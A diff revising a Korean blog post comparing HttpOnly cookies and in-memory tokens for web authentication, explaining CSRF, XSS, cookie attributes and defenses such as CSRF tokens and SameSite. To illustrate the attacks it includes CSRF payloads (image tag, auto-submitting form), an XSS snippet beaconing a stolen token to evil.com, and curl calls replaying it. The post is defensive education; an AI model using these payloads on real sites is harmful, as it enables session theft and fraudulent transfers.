@@ -33,8 +33,6 @@ DevTools에서 보이냐 안 보이냐는 보안 기준이 아닙니다. DevTool
 
 성립 조건은 세 가지입니다. 서버에 상태를 변경하는 action이 있고, 쿠키 기반 세션으로 인증하고, 요청에 예측 불가능한 파라미터가 없어야 합니다. CSRF는 **blind attack**이라 공격자는 요청만 보낼 수 있고 응답은 읽지 못합니다.
 
-공격 형태도 다양합니다.
-
 **GET 기반** — 이미지 태그 하나로 충분합니다.
 ```html
 <img src="https://bank.com/transfer?to=attacker&amount=10000" />
@@ -49,14 +47,7 @@ DevTools에서 보이냐 안 보이냐는 보안 기준이 아닙니다. DevTool
 <script>document.getElementById('csrf-form').submit();</script>
 ```
 
-**JSON 기반** — `enctype="text/plain"`이면 CORS preflight 없이 요청을 보낼 수 있습니다.
-```html
-<form action="https://api.bank.com/transfer" method="POST" enctype="text/plain">
-  <input name='{"to":"attacker","amount":10000,"ignore":"' value='"}' />
-</form>
-```
-
-OWASP CWE Top 25 2025에서 CSRF(CWE-352)는 **3위**입니다. 2024년 4위, 그 이전 9위에서 계속 올라가고 있습니다. SameSite=Lax가 기본값이 된 시대에 순위가 오르는 이유는, CSRF가 다른 취약점과 체인으로 엮이면서 공격 수단으로서의 가치가 높아졌기 때문입니다.
+OWASP CWE Top 25 2025에서 CSRF(CWE-352)는 **3위**입니다. SameSite=Lax가 기본값이 된 시대에 순위가 오히려 오르는 이유는, CSRF가 다른 취약점과 체인으로 엮이면서 공격 수단으로서의 가치가 높아졌기 때문입니다.
 
 ### CSRF 방어: SameSite
 
@@ -78,8 +69,6 @@ Chrome 80(2020년 2월)부터 SameSite 미지정 시 Lax가 기본값입니다. 
 
 **서브도메인.** SameSite는 eTLD+1로 Same-Site를 판단합니다. `evil.example.com`과 `bank.example.com`은 Same-Site입니다. 서브도메인 하나가 뚫리면 SameSite는 무력합니다.
 
-OWASP도 "아직 완전히 성숙하지 않았으며, 단독 방어로 권장하지 않는다"고 명시합니다.
-
 **Strict를 안 쓰는 이유.** Strict는 보안이 가장 강하지만 UX를 망가뜨립니다. 이메일 링크를 클릭해도 로그인이 풀리고, 검색 엔진에서 들어와도 마찬가지입니다. 실무에서는 이중 쿠키 패턴을 씁니다.
 
 ```
@@ -89,30 +78,47 @@ session:      SameSite=Strict → 민감한 쓰기 작업용 (CSRF 완전 차단
 
 ### CSRF 방어: 토큰과 헤더
 
-SameSite만으로 부족하니 추가 방어가 필요합니다.
+SameSite만으로는 서브도메인 공격, GET 상태 변경 같은 구멍이 남습니다. 추가 방어의 핵심 원리는 하나입니다: **공격자가 알 수 없는 값을 요청에 포함시켜라.**
 
-**Synchronizer Token Pattern** — OWASP primary recommendation입니다. 서버가 세션에 묶인 128비트 이상의 랜덤 토큰을 생성해 폼의 hidden field로 내려보내고, 요청 시 일치 여부를 검증합니다. Same-Origin Policy 때문에 공격자는 bank.com 페이지를 읽을 수 없으므로 토큰 값을 알 수 없습니다.
+CSRF가 성립하는 이유를 다시 봅니다. 공격자는 사용자의 브라우저를 이용해 요청을 보내지만, Same-Origin Policy 때문에 대상 사이트의 페이지 내용은 읽지 못합니다. 이 제약을 역으로 이용합니다 — 서버가 페이지에 비밀 값을 심어두고 요청 시 함께 보내게 하면, 페이지를 읽을 수 없는 공격자는 그 값을 알 수 없으므로 요청을 위조할 수 없습니다.
 
-**Double Submit Cookie (HMAC 변형)** — stateless 대안입니다. CSRF 값을 쿠키와 요청 파라미터 양쪽에 설정하고 일치 여부를 검증합니다. HMAC 서명을 추가하면 Cookie Tossing 공격도 막습니다.
+**Synchronizer Token Pattern** — OWASP가 가장 먼저 권장하는 방식입니다.
 
-**Custom Request Header** — `X-Requested-With` 같은 커스텀 헤더를 요구하면 cross-origin 요청에서 CORS preflight가 발생합니다. 서버가 허용하지 않은 origin은 preflight에서 차단됩니다.
+```
+1. 사용자 로그인 → 서버가 세션에 묶인 랜덤 토큰(128비트 이상) 생성
+2. 서버가 HTML 폼에 hidden field로 토큰 삽입
+   <input type="hidden" name="_csrf" value="a1b2c3..." />
+3. 사용자가 폼 제출 → 토큰이 함께 전송
+4. 서버가 세션의 토큰 vs 요청의 토큰 대조 → 불일치 시 거부
+```
 
-**Fetch Metadata (Sec-Fetch-*)** — 브라우저가 자동으로 붙이는 헤더로, 요청의 출처와 맥락을 서버에 알려줍니다. `Sec-Fetch-Site: cross-site`인 요청을 거부하면 됩니다. Go 1.25 표준 라이브러리의 `CrossOriginProtection`이 이 방식입니다.
+공격자가 evil.com에서 bank.com/transfer 폼을 위조해도, hidden field에 들어갈 토큰 값을 알 수 없습니다. bank.com 페이지를 읽어야 토큰을 알 수 있는데, Same-Origin Policy가 이를 차단합니다.
 
-프레임워크마다 지원 수준이 다릅니다.
+**Double Submit Cookie** — 서버에 세션 상태를 저장하지 않는 stateless 환경을 위한 대안입니다.
 
-| 프레임워크 | 내장 지원 | 방식 |
-|:--|:--|:--|
-| Django | 기본 활성화 | `CsrfViewMiddleware`, 쿠키+hidden field (BREACH 완화용 마스킹) |
-| Spring Security | 기본 활성화 | `CsrfFilter`, Synchronizer Token |
-| Ruby on Rails | 기본 활성화 | `protect_from_forgery` |
-| Express.js | **없음** | `csurf` 2022년 deprecated (`Math.random()` 사용, Cookie Tossing 취약). 대안: `csrf-csrf` |
-| Next.js | **없음** | Server Actions에서 직접 구현 필요 |
-| Go 1.25+ | 표준 라이브러리 | Fetch Metadata 기반 `CrossOriginProtection` |
+```
+1. 서버가 랜덤 값을 쿠키와 응답 본문 양쪽에 설정
+2. 클라이언트가 요청 시 쿠키는 자동 전송 + 같은 값을 헤더/body에도 직접 첨부
+3. 서버가 쿠키 값 vs 헤더/body 값 대조 → 불일치 시 거부
+```
 
-Express와 Next.js는 직접 구현해야 합니다.
+공격자는 cross-site 요청으로 쿠키를 자동 전송시킬 수 있지만, 헤더나 body에 같은 값을 넣으려면 쿠키 값을 먼저 읽어야 합니다. `HttpOnly` 쿠키는 JavaScript로 읽을 수 없고, cross-origin에서는 `Set-Cookie` 응답도 볼 수 없으므로 값을 알 수 없습니다. HMAC 서명을 추가하면 서브도메인에서 쿠키를 덮어쓰는 Cookie Tossing 공격까지 차단됩니다 — 서버의 비밀키 없이는 유효한 서명을 만들 수 없기 때문입니다.
 
-여기까지가 쿠키의 자동 전송이 만드는 문제(CSRF)와 그 방어입니다. 정리하면, 쿠키를 쓰더라도 `SameSite=Lax` + CSRF 토큰을 조합하면 CSRF는 대부분 막힙니다.
+**Custom Request Header** — 커스텀 헤더 존재 여부로 검증하는 방식입니다.
+
+```javascript
+// 클라이언트: 모든 상태 변경 요청에 커스텀 헤더 추가
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: { 'X-Requested-With': 'XMLHttpRequest' },
+  body: JSON.stringify({ to: 'recipient', amount: 1000 })
+});
+// 서버: 이 헤더가 없으면 요청 거부
+```
+
+cross-origin 요청에 커스텀 헤더를 붙이면 브라우저가 먼저 preflight(OPTIONS) 요청을 보냅니다. 서버가 해당 origin을 허용하지 않으면 preflight에서 차단되어 본 요청이 전송되지 않습니다. HTML 폼 태그로는 커스텀 헤더를 설정할 수 없으므로 폼 기반 CSRF도 차단됩니다.
+
+여기까지가 쿠키의 자동 전송이 만드는 문제(CSRF)와 그 방어입니다. 쿠키를 쓰더라도 `SameSite=Lax` + CSRF 토큰을 조합하면 CSRF는 대부분 막힙니다.
 
 그런데 메모리 토큰은 CSRF에 **완전히 면역**입니다. `Authorization` 헤더에 코드가 직접 첨부하니까 cross-site에서 위조할 방법이 없습니다. 이것만 보면 메모리가 더 나아 보입니다.
 
@@ -137,120 +143,80 @@ MITRE/CISA 기준 2024년 가장 위험한 소프트웨어 약점에서 **XSS가
 
 **XSS가 더 위험하고, 쿠키의 약점은 방어가 되고, 메모리의 약점은 방어가 안 됩니다.** HttpOnly 쿠키 + CSRF 방어가 메모리보다 안전합니다.
 
-## 그러면 XSS가 뚫렸을 때 뭐가 달라지나
+## XSS 발생 시 저장 방식별 피해 범위
 
-쿠키든 메모리든 XSS가 뚫리면 세션을 이용당합니다. "어차피 둘 다 뚫리는 거 아냐?"라고 할 수 있는데, 피해 성격이 다릅니다.
+"어차피 XSS가 뚫리면 둘 다 끝 아닌가?" — 둘 다 피해를 입는 건 맞지만, 공격자가 확보하는 능력이 근본적으로 다릅니다. 차이는 토큰을 공격자의 환경으로 유출할 수 있느냐에서 갈립니다.
 
-### HttpOnly 쿠키 — 리모컨을 빌려 쓰는 것
+### HttpOnly 쿠키: 세션 바운드 프록시 공격
 
 ```javascript
-// XSS 스크립트가 피해자 브라우저 안에서 대리 요청
+// XSS 코드가 피해자의 브라우저 안에서 API를 직접 호출
 fetch('/api/transfer', {
   method: 'POST',
   body: JSON.stringify({ to: 'attacker', amount: 10000 })
 });
-// 쿠키가 자동으로 붙으니 요청은 성공하지만 토큰 값 자체는 모름
+// 쿠키가 자동으로 붙어 요청은 성공하지만, 토큰 값 자체는 접근 불가
 ```
 
-- 피해자 브라우저 안에서만 **대리 요청** 가능
-- 토큰 값을 **외부로 가져갈 수 없음**
-- 피해자가 탭을 닫으면 **공격 종료**
+공격자는 피해자의 브라우저를 프록시로 사용합니다. XSS 스크립트가 실행되는 동안에만, 해당 탭 안에서만 동작합니다.
 
-### 메모리 토큰 — 열쇠를 복사해 가는 것
+- 토큰 값을 외부로 유출할 수 없음 — `HttpOnly`가 JavaScript 접근을 차단
+- 피해자가 페이지를 떠나면 공격 종료
+- 서버 측 rate limiting, 이상 탐지가 유효 (동일 IP/세션)
+
+### 메모리 토큰: 토큰 유출 후 오프사이트 공격
 
 ```javascript
-// XSS 스크립트가 토큰 값을 외부로 유출
-const stolen = window.__accessToken;
-navigator.sendBeacon('https://evil.com/collect', stolen);
+// XSS 코드가 메모리에서 토큰을 읽어 외부로 전송
+const token = window.__accessToken;
+navigator.sendBeacon('https://evil.com/collect', token);
 ```
 
 ```bash
-# 공격자가 자기 컴퓨터에서 자유롭게 사용
-curl -H "Authorization: Bearer stolen_token" https://api.target.com/users
-curl -H "Authorization: Bearer stolen_token" https://api.target.com/transfer
+# 공격자가 자신의 환경에서 독립적으로 API 호출
+curl -H "Authorization: Bearer <탈취한 토큰>" https://api.target.com/users
+curl -H "Authorization: Bearer <탈취한 토큰>" https://api.target.com/admin/settings
 ```
 
-- 토큰을 **외부로 유출** → 공격자 환경에서 사용
-- 피해자가 브라우저를 꺼도 **만료까지 공격 지속**
-- 자동화 스크립트로 대량 요청 가능
+토큰이 외부로 유출되면 공격자는 피해자의 브라우저가 필요 없어집니다.
 
-HttpOnly 쿠키는 피해가 **실시간, 세션 한정**이고, 메모리 토큰은 **만료까지 지속, 외부 무제한**입니다.
+- 토큰을 공격자 서버로 전송 → 피해자 환경과 독립적으로 사용
+- 피해자가 브라우저를 닫아도 토큰 만료 시까지 공격 지속
+- 공격자 인프라에서 자동화 가능 — 다른 IP에서 오는 요청이라 탐지가 어려움
+
+| 구분 | HttpOnly 쿠키 | 메모리 토큰 |
+|:--|:--|:--|
+| 공격 범위 | 피해자 브라우저 내부 | 공격자 환경 (외부) |
+| 공격 지속 | 세션/페이지 한정 | 토큰 만료까지 |
+| 토큰 유출 | 불가 | 가능 |
+| 서버 측 탐지 | 가능 (동일 IP/세션) | 어려움 (다른 IP/환경) |
 
 ## 쿠키를 쓰기로 했다면: 보안 속성
 
-쿠키가 메모리보다 안전하다는 결론이 나왔으니, 쿠키를 제대로 설정하는 방법을 정리합니다.
+쿠키가 메모리보다 안전하다는 결론이 나왔으니, 쿠키를 제대로 설정하는 방법을 정리합니다. 각 속성은 서로 다른 공격 벡터를 차단하며, 조합해서 사용해야 합니다.
 
-### HttpOnly
-
-`document.cookie` 접근을 차단합니다. XSS가 실행되어도 쿠키 **값 자체를 탈취**하는 건 막습니다. 다만 XSS로 인증된 API를 호출하는 것까지는 못 막습니다. 쿠키가 자동으로 붙으니까요.
-
-### Secure
-
-HTTPS에서만 쿠키를 전송합니다. HSTS(`Strict-Transport-Security`)와 함께 설정해야 첫 HTTP 요청 노출도 방지됩니다.
-
-### Domain
-
-생략하면 Host-Only Cookie가 되어 해당 호스트에서만 전송됩니다. `Domain=bank.com`으로 설정하면 `*.bank.com` 전체에 전송됩니다. 가장 약한 서브도메인이 전체 보안 수준을 결정하므로 생략이 더 안전합니다.
-
-### __Host- / __Secure- 접두사
-
-```
-__Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
-```
-
-`__Host-` 접두사는 브라우저가 `Secure` 필수, `Path=/` 필수, `Domain` 설정 불가를 강제합니다. 서브도메인이나 비보안 채널에서 같은 이름의 쿠키를 덮어쓰는 Cookie Tossing을 원천 차단합니다.
-
-### 각 속성이 막는 범위
+`HttpOnly`는 `document.cookie` 접근을 차단합니다. XSS가 실행되어도 쿠키 값 자체의 탈취를 막습니다. 다만 인증된 API 호출(대리 실행)까지는 방어하지 못합니다. `Secure`는 HTTPS 연결에서만 쿠키를 전송합니다. `Strict-Transport-Security`(HSTS)와 함께 설정해야 첫 HTTP 요청에서의 노출도 방지됩니다. `Domain`은 생략하는 것이 더 안전합니다. 생략하면 해당 호스트에서만 전송되는 Host-Only Cookie가 되고, `Domain=example.com`으로 설정하면 `*.example.com` 전체에 전송되어 가장 약한 서브도메인이 전체 보안 수준을 결정합니다. `__Host-` 접두사는 브라우저가 `Secure` 필수, `Path=/` 필수, `Domain` 설정 불가를 강제합니다. 서브도메인이나 비보안 채널에서 같은 이름의 쿠키를 덮어쓰는 Cookie Tossing을 원천 차단합니다.
 
 |  | CSRF | XSS 쿠키 탈취 | MITM | Cookie Tossing |
 |:--|:--|:--|:--|:--|
-| SameSite=Lax | 부분 방어 | 방어 불가 | 방어 불가 | 방어 불가 |
-| SameSite=Strict | 완전 방어 | 방어 불가 | 방어 불가 | 방어 불가 |
-| HttpOnly | 방어 불가 | 부분 방어 | 방어 불가 | 방어 불가 |
-| Secure | 방어 불가 | 방어 불가 | 완전 방어 | 방어 불가 |
-| __Host- 접두사 | 방어 불가 | 방어 불가 | 완전 방어 | 완전 방어 |
+| SameSite=Lax | 부분 방어 | — | — | — |
+| SameSite=Strict | 완전 방어 | — | — | — |
+| HttpOnly | — | 탈취 차단 | — | — |
+| Secure | — | — | 완전 방어 | — |
+| __Host- 접두사 | — | — | 완전 방어 | 완전 방어 |
 
-### 운영 환경 권장 설정
+운영 환경 권장 설정:
 
 ```
-# 세션 쿠키
+# 세션 쿠키 — 모든 보안 속성 적용
 __Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
 
-# CSRF 토큰 (JavaScript가 읽어야 하므로 HttpOnly 제외)
+# CSRF 토큰 — JavaScript가 읽어야 하므로 HttpOnly 제외
 __Host-csrf=xyz; Secure; SameSite=Strict; Path=/
 
-# 로그인 표시 (민감하지 않은 데이터)
+# 로그인 상태 표시 — 민감하지 않은 데이터
 __Secure-logged_in=true; Secure; SameSite=Lax; Path=/
 ```
-
-## 절충안: 하이브리드 패턴
-
-쿠키는 CSRF 방어가 필요하고, 메모리는 XSS 탈취에 무방비입니다. 이 트레이드오프를 절충하는 방식이 있습니다.
-
-- **Refresh token**: `HttpOnly`, `Secure`, `SameSite=Strict` 쿠키
-- **Access token**: JavaScript 변수(메모리), 수명 5~15분
-
-```javascript
-let accessToken = loginResponse.accessToken; // 메모리에만 존재
-
-// API 호출: Authorization 헤더로 전송 (CSRF 면역)
-fetch('/api/data', {
-  headers: { Authorization: `Bearer ${accessToken}` }
-});
-
-// 새로고침: refresh 쿠키로 access token 재발급
-accessToken = await refreshAccessToken();
-```
-
-refresh token은 `HttpOnly`로 XSS 탈취를 막고, access token은 헤더 전송으로 CSRF를 제거합니다. 하지만 access token이 메모리에 있는 동안은 XSS에 노출됩니다. 5~15분이지만 그 안에 토큰을 빼가면 만료 전까지 외부에서 쓸 수 있습니다.
-
-하이브리드의 목적은 "XSS를 막겠다"가 아니라 **"피해 시간을 제한하겠다"**입니다.
-
-| | HttpOnly 쿠키만 | 하이브리드 |
-|:--|:--|:--|
-| XSS 토큰 탈취 | **불가** | 가능 (만료까지 외부 사용) |
-| CSRF | 방어 필요 (`SameSite` + CSRF 토큰) | **면역** |
-| 구현 복잡도 | 낮음 | 높음 |
 
 ## 현실의 공격은 체인이다
 
@@ -272,14 +238,7 @@ same-origin XSS는 CSRF 토큰을 DOM에서 읽을 수 있습니다. CSRF 토큰
 
 ### CORS 설정 오류 → CSRF 업그레이드
 
-CSRF는 blind attack이라 응답을 읽지 못합니다. 하지만 CORS가 잘못 설정되면 이 제약이 사라집니다. "쓰기만 가능한" CSRF가 "읽기+쓰기" 공격으로 업그레이드됩니다.
-
-위험한 CORS 패턴:
-1. Origin 헤더 그대로 반사 (`Access-Control-Allow-Origin: <요청 Origin>`)
-2. 정규식 화이트리스트 실수 (`bank.com.evil.com` 매칭)
-3. 모든 서브도메인 신뢰
-4. `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`
-5. 내부 네트워크 CORS 허용
+CSRF는 blind attack이라 응답을 읽지 못합니다. 하지만 CORS가 잘못 설정되면 이 제약이 사라집니다. Origin 헤더를 그대로 반사하거나, 정규식 화이트리스트 실수(`bank.com.evil.com` 매칭), 모든 서브도메인을 무조건 신뢰하는 설정이 대표적입니다. "쓰기만 가능한" CSRF가 "읽기+쓰기" 공격으로 업그레이드됩니다.
 
 ### 실제 사례: Langflow CVE-2025-34291 (CVSS 9.4)
 
@@ -294,108 +253,19 @@ CSRF는 blind attack이라 응답을 읽지 못합니다. 하지만 CORS가 잘�
 
 CORS 설정 오류 + SameSite=None + CSRF 미적용 세 가지가 결합되어 시스템 전체가 뚫린 사례입니다.
 
-### 2024-2025 주요 CVE
-
-| CVE | 대상 | CVSS | 핵심 |
-|:--|:--|:--|:--|
-| CVE-2025-34291 | Langflow AI | 9.4 | CORS + CSRF + RCE 체인 |
-| CVE-2025-32642 | WordPress 플러그인 | 10.0 | CSRF → Remote Code Inclusion |
-| CVE-2025-53767 | Azure OpenAI | 10.0 | SSRF로 클라우드 인프라 접근 |
-| Cisco Expressway | Cisco | — | 미인증 원격 CSRF |
-| Qwik < 1.19.0 | Qwik Framework | — | Content-Type 조작으로 CSRF 우회 |
-
-## 업계는 전부 같은 말을 한다
-
-여기까지 정리하면, 쿠키가 메모리보다 낫고, 쿠키도 완벽하지 않고, 공격은 체인으로 엮입니다. 그러면 업계는 어떤 답을 내놓고 있을까요. 주요 표준과 권고를 보면 전부 같은 방향을 가리킵니다.
-
-**OWASP** — "Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the httpOnly flag." ASVS v4.0 V3.4.1은 쿠키 기반 세션 토큰에 `Secure`, `HttpOnly`, `SameSite`를 **필수**로 요구합니다.
-
-**NIST SP 800-63B** — "Secrets used for session binding SHOULD NOT be placed in insecure locations such as HTML5 Local Storage due to the potential exposure of local storage to cross-site scripting (XSS) attacks." 세션 시크릿은 애플리케이션 재시작 시 지속되어서도 안 됩니다.
-
-**IETF OAuth Working Group** — draft-ietf-oauth-browser-based-apps-26 (2025년 12월) 권고 우선순위:
-
-1. **가장 좋은 방법**: Token-mediating backend (BFF) — 토큰이 브라우저에 도달하지 않음
-2. **차선**: Authorization Code + PKCE, 짧은 수명 토큰 + refresh token rotation
-3. **피해야 함**: localStorage나 JavaScript 접근 가능한 영구 저장소
-
-이 문서의 핵심 지적: "Even if the application finds a storage mechanism that completely isolates stored tokens, an attacker with XSS will still be able to request a new set of tokens." 저장소를 아무리 격리해도 XSS가 뚫리면 공격자가 새 토큰을 직접 발급받을 수 있습니다.
-
-**FAPI 2.0** — Financial-Grade API 2.0은 저장 위치가 아닌 토큰 자체에서 답을 찾습니다. Bearer 토큰을 허용하지 않고 모든 access token에 sender-constraining을 겁니다.
-
-```
-FAPI 2.0 필수 요구사항:
-- Sender-constrained access tokens (mTLS 또는 DPoP)
-- Pushed Authorization Requests (PAR)
-- PKCE with S256
-- Public Client 사용 금지
-```
-
-토큰이 탈취되어도 공격자 환경에서는 사용 불가합니다. 한국, 영국, 호주, 브라질, EU 오픈뱅킹에서 채택하고 있습니다.
-
-공통된 결론: **브라우저에 토큰을 두지 마라.**
-
-## 최종 답: 안 보내는 게 답이다
-
-쿠키든 메모리든 브라우저에 토큰이 있는 한 완벽한 방어는 없습니다. 엔터프라이즈의 결론은 토큰을 브라우저에 보내지 않는 것입니다.
-
-### BFF (Backend-for-Frontend)
-
-```
-브라우저 ←→ BFF 서버 ←→ API 서버
-   │              │
-   │ 세션 쿠키     │ access token
-   │ (HttpOnly)   │ (서버 메모리/Redis)
-```
-
-BFF 서버가 OAuth 인증을 대행하고 토큰을 서버 측 세션(Redis 등)에 저장합니다. 브라우저에는 암호화된 `HttpOnly` 세션 쿠키만 전달됩니다. XSS가 뚫려도 탈취할 토큰이 없습니다.
-
-### DPoP (Demonstration of Proof-of-Possession) — RFC 9449
-
-BFF를 쓸 수 없는 환경에서 토큰 탈취 시 사용을 막는 방식입니다.
-
-```
-1. 클라이언트가 공개키/비밀키 쌍 생성 (Web Crypto API)
-2. 토큰 요청 시 DPoP proof JWT (비밀키로 서명) 첨부
-3. 인가 서버가 access token을 클라이언트 공개키에 바인딩
-4. API 호출마다 DPoP proof 함께 전송
-5. 토큰만 탈취해도 비밀키 없이는 사용 불가
-```
-
-Auth0(Early Access), Okta(프로덕션), Kong Gateway Enterprise 3.7+에서 지원합니다. 브라우저에서는 XSS로 Web Crypto API 키에 접근 가능하므로 BFF나 네이티브 앱에서 가장 효과적입니다.
-
-### DBSC (Device Bound Session Credentials)
-
-Google이 개발 중인 기술입니다. TPM에 비밀키를 저장해서 세션을 디바이스에 바인딩합니다. 토큰이 탈취되어도 다른 디바이스에서 사용 불가. Chrome 135에서 origin trial 진행 중이고 Windows + TPM 환경에서 동작합니다.
-
-### 보안 수준별 선택
-
-| 보안 수준 | 아키텍처 | 토큰 위치 | 적용 분야 |
-|:--|:--|:--|:--|
-| 최고 | BFF + FAPI 2.0 + DPoP/mTLS | 서버만, 브라우저는 암호화된 세션 쿠키 | 금융, 의료, 정부 |
-| 높음 | BFF | 서버, 브라우저는 HttpOnly 세션 쿠키 | 엔터프라이즈 SaaS |
-| 중간 | HttpOnly 쿠키 + CSRF 방어 | 쿠키 (HttpOnly + SameSite) | 일반 웹 서비스 |
-| 중간 | 하이브리드 | refresh: 쿠키, access: 메모리 | CSRF 제거가 중요한 SPA |
-| 피해야 함 | localStorage/sessionStorage | — | — |
-
 ## 정리
 
-"토큰을 어디에 저장하지?"라는 질문에서 시작했습니다. 쿠키와 메모리의 차이는 두 가지 — 자동 전송 여부와 JS 접근 가능 여부 — 이고, 이 차이가 각각 CSRF와 XSS 토큰 탈취라는 취약점을 만듭니다. XSS가 CSRF보다 훨씬 위험하고, 쿠키의 약점(CSRF)은 방어 수단이 있지만 메모리의 약점(XSS 탈취)은 막을 방법이 없으므로, HttpOnly 쿠키가 메모리보다 안전합니다. 하지만 쿠키도 XSS 앞에서 완전하지 않습니다 — 탈취는 못 해도 대리 요청은 가능하고, 현실의 공격은 단일 취약점이 아니라 체인입니다. 업계 표준이 전부 같은 결론을 내리는 이유가 여기 있습니다. 최종 답은 "어디에 저장할까"가 아니라 "브라우저에 보내지 않는 것", BFF입니다.
+"토큰을 어디에 저장하지?"라는 질문에서 시작했습니다. 쿠키와 메모리의 보안 차이는 두 가지 — 자동 전송 여부와 JS 접근 가능 여부 — 이고, 이 차이가 각각 CSRF와 XSS 토큰 탈취라는 취약점을 만듭니다.
+
+XSS가 CSRF보다 위험하고, 쿠키의 약점(CSRF)은 방어 수단이 있지만 메모리의 약점(XSS 탈취)은 막을 방법이 없으므로, HttpOnly 쿠키가 메모리보다 안전합니다. 다만 쿠키도 XSS 앞에서 완전하지 않습니다 — 탈취는 못 해도 대리 요청은 가능하고, 현실의 공격은 단일 취약점이 아니라 체인으로 엮입니다.
+
+`HttpOnly` + `Secure` + `SameSite=Lax` + CSRF 토큰 조합이 대부분의 웹 서비스에서 현실적인 선택입니다. 토큰을 브라우저에 아예 보내지 않는 BFF(Backend-for-Frontend) 패턴이 가장 안전하지만, 아키텍처 복잡도와 트레이드오프가 있습니다.
 
 ## References
 
 - [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
-- [OWASP ASVS v4.0 V3 — Session Management](https://github.com/OWASP/ASVS)
-- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
 - [CWE Top 25 Most Dangerous Software Weaknesses 2025](https://cwe.mitre.org/top25/archive/2025/2025_cwe_top25.html)
-- [NIST SP 800-63B Section 7.1](https://pages.nist.gov/800-63-3/sp800-63b.html)
-- [IETF draft-ietf-oauth-browser-based-apps-26](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps)
-- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/rfc9700/)
-- [RFC 9449 — OAuth 2.0 DPoP](https://datatracker.ietf.org/doc/html/rfc9449)
-- [FAPI 2.0 Specifications](https://oauth.net/fapi/)
 - [MDN - SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite)
 - [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
 - [Auth0 — Token Storage](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
 - [Auth0 — The Backend for Frontend Pattern](https://auth0.com/blog/the-backend-for-frontend-pattern-bff/)
-- [Curity — Token Handler Pattern](https://curity.io/resources/learn/the-token-handler-pattern/)
-- [Mercari Engineering — Building Secure Apps Using Web Workers](https://engineering.mercari.com/en/blog/entry/20220930-building-secure-apps-using-web-workers/)
-- [Chrome — Device Bound Session Credentials](https://developer.chrome.com/docs/web-platform/device-bound-session-credentials)
